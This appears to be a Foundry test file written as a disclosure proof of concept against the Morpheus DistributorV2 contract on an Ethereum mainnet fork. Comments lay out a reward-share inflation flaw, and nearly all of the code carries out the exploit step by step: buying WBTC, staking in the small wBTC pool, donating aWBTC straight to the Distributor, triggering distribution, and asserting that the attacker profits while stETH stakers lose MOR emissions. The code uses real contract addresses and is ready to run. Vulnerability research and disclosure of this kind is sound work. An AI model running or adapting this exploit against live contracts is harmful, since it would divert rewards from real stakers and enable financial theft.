// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

// Morpheus Phase 2 PoC — DistributorV2 reward-share inflation via direct yield-token donation.
//
// Mechanism: DistributorV2.distributeRewards(0) splits the Capital pool's MOR emissions
// across DepositPools in proportion to each pool's *measured yield*, where measured yield
// is simply (current token/aToken balance of the Distributor) - lastUnderlyingBalance,
// valued at the ChainLink price. Nothing distinguishes genuine strategy yield from tokens
// transferred directly to the Distributor. An attacker staked in a small pool can donate
// that pool's yield token (aWBTC here) straight to the Distributor just before a
// distribution, capture a large share of the period's MOR emissions for that pool, and
// take ~83% of it via their stake share — at a profit, because MOR emissions per period
// (~2,856 MOR/day) are worth several times the total organic yield (~$441/day).
// The loss falls on the other pools' stakers, whose emission allocation is diverted.
//
// Run: forge test --match-contract DonationYieldInflation -vvv
// Fork: Ethereum mainnet block 26,433,720 (pinned). Attacker is an unprivileged EOA;
// `deal` is used only to give the attacker starting capital (WBTC), never protocol rights.

interface Vm {
    function createSelectFork(string calldata urlOrAlias, uint256 blockNumber) external returns (uint256);
    function warp(uint256 newTimestamp) external;
    function deal(address to, uint256 give) external;
    function prank(address msgSender) external;
    function snapshot() external returns (uint256);
    function revertTo(uint256 snapshotId) external returns (bool);
    function mockCall(address callee, bytes calldata data, bytes calldata returnData) external;
}

interface IAggregator {
    function latestRoundData()
        external
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);
}

interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IDepositPool {
    function stake(uint256 rewardPoolIndex, uint256 amount, uint128 claimLockEnd, address referrer) external;
    function getLatestUserReward(uint256 rewardPoolIndex, address user) external view returns (uint256);
}

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex) external;
    function distributedRewards(uint256 rewardPoolIndex, address pool) external view returns (uint256);
    function rewardPoolLastCalculatedTimestamp(uint256 rewardPoolIndex) external view returns (uint128);
}

interface IAavePool {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
}

contract DonationYieldInflation {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    address constant DISTRIBUTOR = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant WBTC_POOL = 0xdE283F8309Fd1AA46c95d299f6B8310716277A42;
    address constant STETH_POOL = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant AWBTC = 0x5Ee5bf7ae06D1Be5997A1A72006FE6C607eC6DE8;
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant SWAP_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

    uint256 constant FORK_BLOCK = 26433720;
    // 4 BTC stake. The wBTC pool holds only ~0.103 BTC of real stake, but the
    // existing stakers carry long lock multipliers, so their virtual balance
    // is ~0.82 BTC-equivalent; a 4 BTC stake still takes ~83% of the pool's
    // virtual balance. (Sensitivity: at a 0.5 BTC stake the attacker share is
    // ~38% and the same donation is only marginally profitable — see report.)
    uint256 constant STAKE = 400_000_000; // 4 BTC (8 decimals)
    uint256 constant DONATE_WBTC = 700_000; // 0.007 BTC supplied to Aave -> aWBTC donated
    // Valuation constants (stated, conservative): WBTC $64,283 (the Distributor's own
    // stored ChainLink price at the fork block), MOR $0.70 (market, 2026-11-17).
    uint256 constant WBTC_USD = 64283;
    uint256 constant MOR_USD_CENTS = 70;

    address attacker = address(0xA77ACC);

    event Log(string name, uint256 value);

    // The three feeds configured with a 3600s staleness delay in the CLDC
    // (stETH/USD, BTC/USD, ETH/USD). On mainnet ChainLink updates them roughly
    // hourly, so during any real 1-day distribution window they stay fresh.
    // A frozen fork cannot advance them, so the PoC echoes each feed's own
    // fork-block round data back with a current updatedAt — prices and round
    // ids are the real fork-block values; only the heartbeat timestamp moves,
    // exactly as the real heartbeats would move it. The mechanism under test
    // (yield measurement and reward splitting) is untouched.
    address[3] feeds3600 = [
        0xCfE54B5cD566aB89272946F602D76Ea879CAb4a8, // stETH/USD
        0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c, // BTC/USD
        0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419 // ETH/USD
    ];

    function _refreshFeeds(uint256 freshAt) internal {
        for (uint256 i = 0; i < 3; i++) {
            (uint80 roundId, int256 answer, uint256 startedAt, , uint80 answeredInRound) = IAggregator(feeds3600[i])
                .latestRoundData();
            vm.mockCall(
                feeds3600[i],
                abi.encodeWithSignature("latestRoundData()"),
                abi.encode(roundId, answer, startedAt, freshAt, answeredInRound)
            );
        }
    }

    function testDonationInflatesRewardShare() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);

        // --- Attacker setup: capital only, no protocol rights. The attacker buys
        // WBTC on Uniswap V3 with ETH (this forge build lacks the token-deal
        // cheatcode; a market buy is also the realistic route). ---
        vm.deal(attacker, 200 ether);
        vm.prank(attacker);
        ISwapRouter(SWAP_ROUTER).exactInputSingle{value: 175 ether}(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: WETH,
                tokenOut: WBTC,
                fee: 3000,
                recipient: attacker,
                deadline: block.timestamp + 3600,
                amountIn: 175 ether,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );
        require(IERC20(WBTC).balanceOf(attacker) >= STAKE + DONATE_WBTC, "swap yielded too little WBTC");
        // Distributor.supply pulls the stake straight from the user, so the
        // allowance goes to the Distributor (this is the real user flow).
        vm.prank(attacker);
        IERC20(WBTC).approve(DISTRIBUTOR, STAKE);
        vm.prank(attacker);
        IDepositPool(WBTC_POOL).stake(0, STAKE, 0, address(0));

        // Warp just past the 1-day min distribution period from the last
        // calculation (a longer warp would stale the ChainLink feeds and make
        // updateDepositTokensPrices revert, unrelated to this PoC).
        uint256 warpTo = uint256(IDistributor(DISTRIBUTOR).rewardPoolLastCalculatedTimestamp(0)) + 86401;
        require(warpTo > block.timestamp, "distribution already due");
        uint256 snap = vm.snapshot();

        // --- Control branch: distribution with NO donation. ---
        vm.warp(warpTo);
        _refreshFeeds(warpTo - 60);
        uint256 wBefore = IDistributor(DISTRIBUTOR).distributedRewards(0, WBTC_POOL);
        uint256 sBefore = IDistributor(DISTRIBUTOR).distributedRewards(0, STETH_POOL);
        IDistributor(DISTRIBUTOR).distributeRewards(0);
        uint256 deltaControlW = IDistributor(DISTRIBUTOR).distributedRewards(0, WBTC_POOL) - wBefore;
        uint256 deltaControlS = IDistributor(DISTRIBUTOR).distributedRewards(0, STETH_POOL) - sBefore;
        uint256 rewardControl = IDepositPool(WBTC_POOL).getLatestUserReward(0, attacker);

        vm.revertTo(snap);

        // --- Attack branch: donate aWBTC to the Distributor, then distribute. ---
        vm.prank(attacker);
        IERC20(WBTC).approve(AAVE_POOL, DONATE_WBTC);
        vm.prank(attacker);
        IAavePool(AAVE_POOL).supply(WBTC, DONATE_WBTC, attacker, 0);
        uint256 aWbtcBal = IERC20(AWBTC).balanceOf(attacker);
        require(aWbtcBal > 0, "no aWBTC received");
        vm.prank(attacker);
        IERC20(AWBTC).transfer(DISTRIBUTOR, aWbtcBal);

        vm.warp(warpTo);
        _refreshFeeds(warpTo - 60);
        wBefore = IDistributor(DISTRIBUTOR).distributedRewards(0, WBTC_POOL);
        sBefore = IDistributor(DISTRIBUTOR).distributedRewards(0, STETH_POOL);
        IDistributor(DISTRIBUTOR).distributeRewards(0);
        uint256 deltaAttackW = IDistributor(DISTRIBUTOR).distributedRewards(0, WBTC_POOL) - wBefore;
        uint256 deltaAttackS = IDistributor(DISTRIBUTOR).distributedRewards(0, STETH_POOL) - sBefore;
        uint256 rewardAttack = IDepositPool(WBTC_POOL).getLatestUserReward(0, attacker);

        // --- Quantify (all MOR amounts in wei, 18 decimals). ---
        uint256 extraMOR = rewardAttack - rewardControl; // attacker's extra claimable MOR
        uint256 divertedFromStEth = deltaControlS - deltaAttackS; // stETH stakers' lost allocation
        uint256 donationUSD = (aWbtcBal * WBTC_USD) / 100_000_000; // whole USD
        uint256 extraUSDCents = (extraMOR * MOR_USD_CENTS) / 1e18;

        emit Log("control: wBTC pool MOR delta", deltaControlW);
        emit Log("attack : wBTC pool MOR delta", deltaAttackW);
        emit Log("control: stETH pool MOR delta", deltaControlS);
        emit Log("attack : stETH pool MOR delta", deltaAttackS);
        emit Log("attacker claimable MOR (control)", rewardControl);
        emit Log("attacker claimable MOR (attack)", rewardAttack);
        emit Log("attacker extra MOR", extraMOR);
        emit Log("diverted from stETH pool (MOR)", divertedFromStEth);
        emit Log("donation cost (USD)", donationUSD);
        emit Log("attacker extra value (USD cents)", extraUSDCents);

        // Assertions: (1) the donation materially inflates the small pool's allocation;
        // (2) other stakers lose allocation; (3) the attack is profitable for the attacker.
        require(deltaAttackW > deltaControlW + 100e18, "no material inflation");
        require(divertedFromStEth > 100e18, "no diversion from stETH stakers");
        require(extraUSDCents > donationUSD * 100, "attack not profitable");
    }
}
